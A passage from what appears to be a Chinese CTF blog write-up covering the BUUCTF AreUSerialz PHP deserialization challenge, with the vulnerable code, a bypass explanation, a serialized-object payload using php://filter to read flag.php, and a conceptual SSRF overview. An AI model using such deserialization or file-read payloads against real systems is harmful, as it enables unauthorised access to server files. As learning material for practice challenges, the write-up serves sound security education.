<span class="keyword">if</span>(strlen((string)$this-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                $this-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) $this-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> $this-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $this-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        echo <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $this-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $this-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
需要绕过两个地方</li>
</ul>
<p>1.绕过is_valid(),protected属性<br>方法：用大写S表示字符串，在php7.1+的环境下对属性的要求不是很敏感,用public属性绕过private属性产生的%00问题</p>
<p>2.弱类型绕过<br>__destruct()魔术方法中，op===”2”是强比较（类型和属性都等于’2’），而process()使用的是弱比较op==”2”，可以通过弱类型绕过<br>方法：op=2，这时op===”2”为false,op==”2”为true</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>对于file_get_contents()函数，可以用php:filter伪协议读取，将filename置为```php://filter/read=convert.base64-encode/resource=flag.php``。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<span class="comment">//或者直接读&#x27;flag.php&#x27;</span></span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">echo <span class="title">serialize</span><span class="params">(new FileHandler)</span></span>;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;<span class="attr">s</span>:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/202104070956025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{12ffa359-defc-4dc6-b363-0b6f48c79b91}</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><ul>
<li>1.介绍SSRF <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d1d1c40f6d4c">参考文章</a></li>
</ul>
<ol>
<li><p>SSRF简介</p>
<pre><code>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。


由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。
</code></pre>
</li>
<li><p>SSRF形成原因</p>
<pre><code>大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。

最常见的例子：攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF漏洞。
</code></pre>
</li>
<li><p>SSRF与CSRF的区别</p>
<pre><code>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器；

SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。
</code></pre>
</li>
<li><p>SSRF的类型</p>
<pre><code>1）显示对攻击者的响应（basic）：在服务器获取攻击者要求的URL后，把响应发送回攻击者。
2）不显示响应（blind）：在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。
</code></pre>
</li>
<li><p>利用SSRF可以实现的攻击</p>
<pre><code>1）获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透；
2）攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）；
3）利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。
</code></pre>
</li>
<li><p>拓展攻击面</p>
<pre><code>结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。
</code></pre>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">K4oer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://k4oer.gitee.io/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html">http://k4oer.gitee.io/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://K4oer.gitee.io" target="_blank">K4oer'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/undefined/%5B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%5D%20Crypto%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81&amp;&amp;%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&amp;&amp;hash%E5%87%BD%E6%95%B0%EF%BC%89.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">K4oer</div><div class="author-info__description">Time is water</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E7%BC%BA%E7%9C%81"><span class="toc-number">1.2.</span> <span class="toc-text">SQL缺省</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">常规流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-HardSQL"><span class="toc-number">1.4.2.</span> <span class="toc-text">BUUCTF HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8MD5%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.4.</span> <span class="toc-text">使用MD5函数实现sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.5.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF-WEB-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-SQL%E7%9B%B2%E6%B3%A8%EF%BC%8CPHP%EF%BC%89"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GYCTF2020-Blacklist-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">[GYCTF2020]Blacklist [堆叠注入]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ping%E5%91%BD%E4%BB%A4"><span class="toc-number">1.5.</span> <span class="toc-text">Ping命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nc"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">nc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado"><span class="toc-number">1.6.</span> <span class="toc-text">tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.7.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">解法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-number">1.7.1.</span> <span class="toc-text">[MRCTF]你传你🐎呢</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">1.8.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">1.9.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.9.1.</span> <span class="toc-text">序列化和反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-number">1.9.2.</span> <span class="toc-text">BUUCTF [网鼎杯 2020 青龙组]AreUSerialz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.10.</span> <span class="toc-text">SSRF</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html" title="无题"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html" title="无题">无题</a><time datetime="2021-05-08T15:03:36.190Z" title="发表于 2021-05-08 23:03:36">2021-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/undefined/%5B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%5D%20Crypto%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81&amp;&amp;%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&amp;&amp;hash%E5%87%BD%E6%95%B0%EF%BC%89.html" title="无题"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/undefined/%5B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%5D%20Crypto%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81&amp;&amp;%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&amp;&amp;hash%E5%87%BD%E6%95%B0%EF%BC%89.html" title="无题">无题</a><time datetime="2021-05-08T11:05:24.607Z" title="发表于 2021-05-08 19:05:24">2021-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/undefined/DES%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html" title="DES算法逆向分析"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DES算法逆向分析"/></a><div class="content"><a class="title" href="/undefined/DES%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html" title="DES算法逆向分析">DES算法逆向分析</a><time datetime="2021-05-04T16:00:00.000Z" title="发表于 2021-05-05 00:00:00">2021-05-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 -&copy;2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> K4oer</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>